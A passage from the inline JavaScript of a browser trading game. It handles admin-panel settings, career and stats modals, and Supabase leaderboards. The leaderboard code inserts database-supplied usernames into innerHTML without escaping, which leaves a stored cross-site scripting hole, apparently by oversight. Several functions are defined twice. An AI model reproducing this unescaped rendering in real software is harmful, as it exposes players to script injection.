        element.textContent = adminSettings.globalVolatilityMultiplier.toFixed(1);
        
        // Color coding based on volatility level
        if (adminSettings.globalVolatilityMultiplier <= 1.0) {
            element.style.color = '#00ff00'; // Green for normal
        } else if (adminSettings.globalVolatilityMultiplier <= 2.0) {
            element.style.color = '#ffff00'; // Yellow for elevated
        } else {
            element.style.color = '#ff0000'; // Red for high
        }
    });
}

function loadAdminPanelValues() {
    // Load scoring system values with safe updates
    const adminSettings = window.adminSettings || {};
    
    safeUpdateElement('breachHedgePoints', adminSettings.breachHedgePoints, 'value');
    safeUpdateElement('breachClearBonus', adminSettings.breachClearBonus, 'value');
    safeUpdateElement('goodTradeBonus', adminSettings.goodTradeBonus, 'value');
    safeUpdateElement('badTradePenalty', adminSettings.badTradePenalty, 'value');
    safeUpdateElement('causeBreachPenalty', adminSettings.causeBreachPenalty, 'value');
    safeUpdateElement('worseBreachPenalty', adminSettings.worseBreachPenalty, 'value');
    safeUpdateElement('timeoutPenalty', adminSettings.timeoutPenalty, 'value');
    
    // Load market behavior values
    safeUpdateElement('globalVolatilityMultiplier', adminSettings.globalVolatilityMultiplier, 'value');
    safeUpdateElement('breachTimerSeconds', adminSettings.breachTimerSeconds, 'value');
    
    // Load coin rewards values
    if (adminSettings.coinRewards) {
        safeUpdateElement('goodTradeCoins', adminSettings.coinRewards.goodTrade, 'value');
        safeUpdateElement('breachHedgeCoins', adminSettings.coinRewards.breachHedge, 'value');
        safeUpdateElement('breachClearCoins', adminSettings.coinRewards.breachClear, 'value');
        safeUpdateElement('endGameDivisor', adminSettings.coinRewards.endGameMultiplier, 'value');
        safeUpdateElement('perfectGameCoins', adminSettings.coinRewards.perfectGameBonus, 'value');
        safeUpdateElement('levelUpCoins', adminSettings.coinRewards.levelUpBonus, 'value');
    }
    
    // Load asset volatility multipliers
    if (adminSettings.assetVolatilityMultipliers) {
        Object.keys(adminSettings.assetVolatilityMultipliers).forEach(assetClass => {
            safeUpdateElement(`${assetClass}VolatilityMultiplier`, adminSettings.assetVolatilityMultipliers[assetClass], 'value');
        });
    }
    
    // Load game end settings
    const gameEndSettings = window.gameEndSettings || {};
    safeUpdateElement('maxMissedTimers', gameEndSettings.maxMissedTimers, 'value');
    safeUpdateElement('timeLimitMinutes', gameEndSettings.timeLimitMinutes, 'value');
    safeUpdateElement('escalationAmount', gameEndSettings.escalationAmount, 'value');
    
    updateGameEndButtons();
}

function updateGameEndButtons() {
    const gameEndSettings = window.gameEndSettings || {};
    
    safeElementOperation('#toggleMissedTimer', missedTimerBtn => {
        missedTimerBtn.textContent = `Missed Timer Limit: ${gameEndSettings.enableMissedTimerLimit ? 'ON' : 'OFF'}`;
        missedTimerBtn.style.background = gameEndSettings.enableMissedTimerLimit ? '#4CAF50' : '#666';
    });
    
    safeElementOperation('#toggleTimeLimit', timeLimitBtn => {
        timeLimitBtn.textContent = `Time Limit: ${gameEndSettings.enableTimeLimit ? 'ON' : 'OFF'}`;
        timeLimitBtn.style.background = gameEndSettings.enableTimeLimit ? '#4CAF50' : '#666';
    });
    
    safeElementOperation('#toggleEscalating', escalatingBtn => {
        escalatingBtn.textContent = `Escalating: ${gameEndSettings.enableEscalatingDifficulty ? 'ON' : 'OFF'}`;
        escalatingBtn.style.background = gameEndSettings.enableEscalatingDifficulty ? '#4CAF50' : '#666';
    });
}

function updateCareerDisplay() {
    const careerLevels = document.querySelectorAll('.career-level');
    careerLevels.forEach((levelDiv, index) => {
        const level = index + 1;
        levelDiv.className = 'career-level';
        
        if (level < userProfile.level) {
            levelDiv.classList.add('unlocked');
        } else if (level === userProfile.level) {
            levelDiv.classList.add('current');
        } else {
            levelDiv.classList.add('locked');
        }
    });
}

function showCareer() {
    updateCareerDisplay();
    safeUpdateStyle('careerModal', 'display', 'flex');
}

function closeCareer() {
    safeUpdateStyle('careerModal', 'display', 'none');
}

function switchLeaderboardTab(tab) {
    document.querySelectorAll('.leaderboard-tab-button').forEach(btn => {
        btn.classList.remove('active');
    });
    
    safeUpdateStyle('levelLeaderboard', 'display', 'none');
    safeUpdateStyle('scoreLeaderboard', 'display', 'none');
    
    if (tab === 'level') {
        safeElementOperation('.leaderboard-tab-button:first-child', btn => btn.classList.add('active'));
        safeUpdateStyle('levelLeaderboard', 'display', 'block');
    } else {
        safeElementOperation('.leaderboard-tab-button:last-child', btn => btn.classList.add('active'));
        safeUpdateStyle('scoreLeaderboard', 'display', 'block');
    }
}

// Export to global scope
window.showAuthScreen = showAuthScreen;
window.showMenu = showMenu;
window.safeUpdateElement = safeUpdateElement;
window.safeUpdateStyle = safeUpdateStyle;
window.safeAddClass = safeAddClass;
window.safeRemoveClass = safeRemoveClass;
window.safeElementOperation = safeElementOperation;
window.waitForElement = waitForElement;
window.updateProfileDisplay = updateProfileDisplay;
window.updateMenuDisplay = updateMenuDisplay;
window.updateScore = updateScore;
window.updateStrikesDisplay = updateStrikesDisplay;
window.updateUnlockedAssets = updateUnlockedAssets;
window.showLevelUp = showLevelUp;
window.showPauseMenu = showPauseMenu;
window.showGameOverModal = showGameOverModal;
window.closeGameOver = closeGameOver;
window.playAgain = playAgain;
window.showInstructions = showInstructions;
window.closeInstructions = closeInstructions;
window.showShop = showShop;
window.closeShop = closeShop;
window.updateShopAvailability = updateShopAvailability;
window.updateGlobalVolatilityDisplay = updateGlobalVolatilityDisplay;
window.loadAdminPanelValues = loadAdminPanelValues;
window.updateGameEndButtons = updateGameEndButtons;
window.updateCareerDisplay = updateCareerDisplay;
window.showCareer = showCareer;
window.closeCareer = closeCareer;
window.switchLeaderboardTab = switchLeaderboardTab;

// ===== STATS_MODULE MODULE =====
// ===== STATS & LEADERBOARDS MODULE =====
// Dependencies: config.js (userProfile, getCareerTitle), auth.js (supabase, currentUser, isGuestMode)
// Exposes: Statistics display, leaderboards, career progression

// Statistics modal functions
function showStats() {
    document.getElementById('totalGames').textContent = userProfile.gamesPlayed;
    document.getElementById('bestScore').textContent = userProfile.bestScore;
    document.getElementById('totalXP').textContent = userProfile.totalXP;
    document.getElementById('currentLevel').textContent = userProfile.level;
    document.getElementById('totalTrades').textContent = userProfile.totalTrades;
    document.getElementById('breachesFixed').textContent = userProfile.breachesFixed;
    document.getElementById('totalCoins').textContent = Math.floor(userProfile.coins);
    
    const winRate = userProfile.gamesPlayed > 0 ? 
        Math.round((userProfile.wins / userProfile.gamesPlayed) * 100) : 0;
    document.getElementById('winRate').textContent = `${winRate}%`;
    
    document.getElementById('statsModal').style.display = 'flex';
}

function closeStatsModal() {
    document.getElementById('statsModal').style.display = 'none';
}

// Career progression functions
function showCareer() {
    updateCareerDisplay();
    document.getElementById('careerModal').style.display = 'flex';
}

function closeCareer() {
    document.getElementById('careerModal').style.display = 'none';
}

function updateCareerDisplay() {
    const careerLevels = document.querySelectorAll('.career-level');
    careerLevels.forEach((levelDiv, index) => {
        const level = index + 1;
        levelDiv.className = 'career-level';
        
        if (level < userProfile.level) {
            levelDiv.classList.add('unlocked');
        } else if (level === userProfile.level) {
            levelDiv.classList.add('current');
        } else {
            levelDiv.classList.add('locked');
        }
    });
}

// Leaderboard functions
async function showLeaderboard() {
    document.getElementById('leaderboardModal').style.display = 'flex';
    
    // Reset to first tab
    switchLeaderboardTab('level');
    
    // Show loading state immediately
    document.getElementById('levelLeaderboard').innerHTML = '<div style="color: #888; text-align: center; padding: 20px;">Loading...</div>';
    document.getElementById('scoreLeaderboard').innerHTML = '<div style="color: #888; text-align: center; padding: 20px;">Loading...</div>';
    
    // Load both leaderboards
    await Promise.all([
        loadLevelLeaderboard(),
        loadScoreLeaderboard()
    ]);
}

function switchLeaderboardTab(tab) {
    // Update tab buttons
    document.querySelectorAll('.leaderboard-tab-button').forEach(btn => {
        btn.classList.remove('active');
    });
    
    // Hide all content
    document.getElementById('levelLeaderboard').style.display = 'none';
    document.getElementById('scoreLeaderboard').style.display = 'none';
    
    // Show selected tab
    if (tab === 'level') {
        document.querySelector('.leaderboard-tab-button:first-child').classList.add('active');
        document.getElementById('levelLeaderboard').style.display = 'block';
    } else {
        document.querySelector('.leaderboard-tab-button:last-child').classList.add('active');
        document.getElementById('scoreLeaderboard').style.display = 'block';
    }
}

async function loadLevelLeaderboard() {
    const levelDiv = document.getElementById('levelLeaderboard');
    
    if (!supabase) {
        levelDiv.innerHTML = '<div style="color: #888; text-align: center; padding: 20px;">Leaderboards not available in guest mode</div>';
        return;
    }
    
    try {
        console.log('Fetching level leaderboard...');
        
        const { data, error } = await supabase
            .from('user_profiles')
            .select('username, level, total_xp')
            .order('level', { ascending: false })
            .order('total_xp', { ascending: false })
            .limit(10);
        
        if (error) {
            console.error('Supabase error:', error);
            throw error;
        }
        
        console.log('Level leaderboard data:', data);
        
        if (data && data.length > 0) {
            levelDiv.innerHTML = data.map((player, index) => {
                const medal = index === 0 ? '' : index === 1 ? '' : index === 2 ? '' : `#${index + 1}`;
                const isCurrentUser = currentUser && player.username === userProfile.username;
                const highlightStyle = isCurrentUser ? 'background: rgba(0,212,255,0.1); border: 1px solid rgba(0,212,255,0.3);' : '';
                
                return `
                    <div style="margin-bottom: 10px; padding: 12px; background: rgba(255,255,255,0.05); border-radius: 8px; ${highlightStyle}">
                        <div style="display: flex; justify-content: space-between; align-items: center;">
                            <div>
                                <strong style="color: #ffffff; font-size: 14px;">
                                    ${medal} ${player.username}
                                    ${isCurrentUser ? ' (You)' : ''}
                                </strong>
                            </div>
                            <div style="text-align: right;">
                                <span style="color: #ffd700; font-weight: bold;">Level ${player.level}</span><br>
                                <small style="color: #888;">${player.total_xp.toLocaleString()} XP</small>
                            </div>
                        </div>
                    </div>
                `;
            }).join('');
        } else {
            // If no data, show just the current player as a fallback
            if (currentUser && !isGuestMode) {
                levelDiv.innerHTML = `
                    <div style="margin-bottom: 10px; padding: 12px; background: rgba(0,212,255,0.1); border: 1px solid rgba(0,212,255,0.3); border-radius: 8px;">
                        <div style="display: flex; justify-content: space-between; align-items: center;">
                            <div>
                                <strong style="color: #ffffff; font-size: 14px;">
                                     ${userProfile.username} (You)
                                </strong>
                            </div>
                            <div style="text-align: right;">
                                <span style="color: #ffd700; font-weight: bold;">Level ${userProfile.level}</span><br>
                                <small style="color: #888;">${userProfile.totalXP} XP</small>
                            </div>
                        </div>
                    </div>
                    <div style="color: #888; text-align: center; padding: 10px;">Be the first to climb the ranks!</div>
                `;
            } else {
                levelDiv.innerHTML = '<div style="color: #888; text-align: center; padding: 20px;">No players yet</div>';
            }
        }
    } catch (error) {
        console.error('Failed to load level leaderboard:', error);
        
        // Show current player as fallback
        if (currentUser && !isGuestMode) {
            levelDiv.innerHTML = `
                <div style="margin-bottom: 10px; padding: 12px; background: rgba(0,212,255,0.1); border: 1px solid rgba(0,212,255,0.3); border-radius: 8px;">
                    <div style="display: flex; justify-content: space-between; align-items: center;">
                        <div>
                            <strong style="color: #ffffff; font-size: 14px;">
                                ${userProfile.username} (You)
                            </strong>
                        </div>
                        <div style="text-align: right;">
                            <span style="color: #ffd700; font-weight: bold;">Level ${userProfile.level}</span><br>
                            <small style="color: #888;">${userProfile.totalXP} XP</small>
                        </div>
                    </div>
                </div>
                <div style="color: #888; text-align: center; padding: 10px; font-size: 12px;">Unable to load full leaderboard</div>
            `;
        } else {
            levelDiv.innerHTML = '<div style="color: #888; text-align: center; padding: 20px;">Failed to load leaderboard</div>';
        }
    }
}

async function loadScoreLeaderboard() {
    const scoreDiv = document.getElementById('scoreLeaderboard');
    
    if (!supabase) {
        scoreDiv.innerHTML = '<div style="color: #888; text-align: center; padding: 20px;">Leaderboards not available in guest mode</div>';
        return;
    }
    
    try {
        console.log('Fetching score leaderboard...');
        
        // Get profiles with best scores > 0, ordered by best score
        const { data: profiles, error: profileError } = await supabase
            .from('user_profiles')
            .select('username, best_score, user_id')
            .gt('best_score', 0)
            .order('best_score', { ascending: false })
            .limit(10);
        
        if (profileError) {
            console.error('Profile error:', profileError);
            throw profileError;
        }
        
        console.log('Score leaderboard data:', profiles);
        
        if (profiles && profiles.length > 0) {
            scoreDiv.innerHTML = profiles.map((profile, index) => {
                const medal = index === 0 ? '' : index === 1 ? '' : index === 2 ? '' : `#${index + 1}`;
                const isCurrentUser = currentUser && profile.user_id === currentUser.id;
                const highlightStyle = isCurrentUser ? 'background: rgba(0,212,255,0.1); border: 1px solid rgba(0,212,255,0.3);' : '';
                
                return `
                    <div style="margin-bottom: 10px; padding: 12px; background: rgba(255,255,255,0.05); border-radius: 8px; ${highlightStyle}">
                        <div style="display: flex; justify-content: space-between; align-items: center;">
                            <div>
                                <strong style="color: #ffffff; font-size: 14px;">
                                    ${medal} ${profile.username}
                                    ${isCurrentUser ? ' (You)' : ''}
                                </strong><br>
                                <small style="color: #888;">Personal Best</small>
                            </div>
                            <div style="text-align: right;">
                                <span style="color: #00ff88; font-weight: bold; font-size: 16px;">${profile.best_score.toLocaleString()}</span><br>
                                <small style="color: #888;">points</small>
                            </div>
                        </div>
                    </div>
                `;
            }).join('');
        } else {
            scoreDiv.innerHTML = '<div style="color: #888; text-align: center; padding: 20px;">No high scores yet - be the first!</div>';
        }
    } catch (error) {
        console.error('Failed to load score leaderboard:', error);
        scoreDiv.innerHTML = '<div style="color: #888; text-align: center; padding: 20px;">Failed to load leaderboard</div>';
    }
}

function closeLeaderboard() {
    document.getElementById('leaderboardModal').style.display = 'none';
}


// Export to global scope
window.showStats = showStats;
window.closeStatsModal = closeStatsModal;
window.showCareer = showCareer;
window.closeCareer = closeCareer;
window.updateCareerDisplay = updateCareerDisplay;
window.showLeaderboard = showLeaderboard;
window.switchLeaderboardTab = switchLeaderboardTab;
window.loadLevelLeaderboard = loadLevelLeaderboard;
window.loadScoreLeaderboard = loadScoreLeaderboard;
window.closeLeaderboard = closeLeaderboard;


// Main initialization
window.addEventListener('load', initializeSupabase);
</script>
</body>
</html>